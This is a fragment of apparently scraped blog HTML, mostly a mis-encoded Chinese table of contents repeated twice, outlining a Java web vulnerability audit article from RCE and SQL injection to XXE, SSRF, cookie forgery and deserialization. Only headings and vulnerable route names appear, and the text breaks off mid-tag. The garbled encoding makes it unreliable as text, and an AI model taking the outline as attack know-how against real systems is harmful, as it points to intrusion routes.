class="toc-text">æ–¹æ³•3ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">æ–¹æ³•4ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">æ–¹æ³•5ï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">äº”ã€CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.è·¯ç”±&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRFé˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">å…­ã€XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.è·¯ç”±&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.è·¯ç”±&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSSæ”»å‡»é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">ä¸ƒã€XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.è·¯ç”±&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.è·¯ç”±&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.è·¯ç”±&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.è·¯ç”±&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.è·¯ç”±&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">ç»Ÿä¸€ä¿®å¤ä»£ç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.è·¯ç”±&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.è·¯ç”±&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.è·¯ç”±&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">å…«ã€å‘½ä»¤æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.è·¯ç”±&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span class="toc-text">2.è·¯ç”±&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">ä¹ã€Cookieä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.è·¯ç”±&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.è·¯ç”±&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.è·¯ç”±&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.è·¯ç”±&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span class="toc-text">5.è·¯ç”±&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.è·¯ç”±&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">åã€CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.è·¯ç”±&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">æ¼æ´éªŒè¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">æ¼æ´é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">ï¼ˆ1ï¼‰é™åˆ¶origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ3ï¼‰spring securityè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">ï¼ˆ6ï¼‰originæ£€æŸ¥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">åä¸€ã€ç›®å½•éå†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.è·¯ç”±&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">åäºŒã€æ–‡ä»¶ä¸Šä¼ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.è·¯ç”±&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.è·¯ç”±&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.è·¯ç”±&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">åå››ã€Deserializeååºåˆ—åŒ–</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">ä¸€ã€RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.è·¯ç”±&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.è·¯ç”±&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.è·¯ç”±&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.è·¯ç”±&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.è·¯ç”±&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">äºŒã€SQLæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.è·¯ç”±&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">ï¼ˆ1ï¼‰é¢„ç¼–è¯‘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">ï¼ˆ2ï¼‰waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">ä¸‰ã€SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.è·¯ç”±&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">å››ã€SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.è·¯ç”±&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.è·¯ç”±&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.è·¯ç”±&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.è·¯ç”±&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRFä¿®å¤ä¸é˜²æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">æ–¹æ³•1ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">æ–¹æ³•2ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">æ–¹æ³•3ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">æ–¹æ³•4ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">æ–¹æ³•5ï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">ï¼ˆ4ï¼‰æ ¸å¿ƒSSRFé˜²æŠ¤ä»£ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">äº”ã€CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.è·¯ç”±&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRFé˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">å…­ã€XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.è·¯ç”±&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.è·¯ç”±&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSSæ”»å‡»é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">ä¸ƒã€XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.è·¯ç”±&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.è·¯ç”±&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.è·¯ç”±&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.è·¯ç”±&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.è·¯ç”±&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.è·¯ç”±&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">ä¸Šè¿°å­˜åœ¨XXEæ¼æ´åº“å¯¹æ¯”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">ç»Ÿä¸€æ¼æ´åˆ©ç”¨payloadï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">ç»Ÿä¸€ä¿®å¤ä»£ç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.è·¯ç”±&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.è·¯ç”±&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.è·¯ç”±&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">å…«ã€å‘½ä»¤æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.è·¯ç”±&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span class="toc-text">2.è·¯ç”±&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">æ¼æ´ä¿®å¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">ä¹ã€Cookieä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.è·¯ç”±&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.è·¯ç”±&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.è·¯ç”±&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.è·¯ç”±&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span 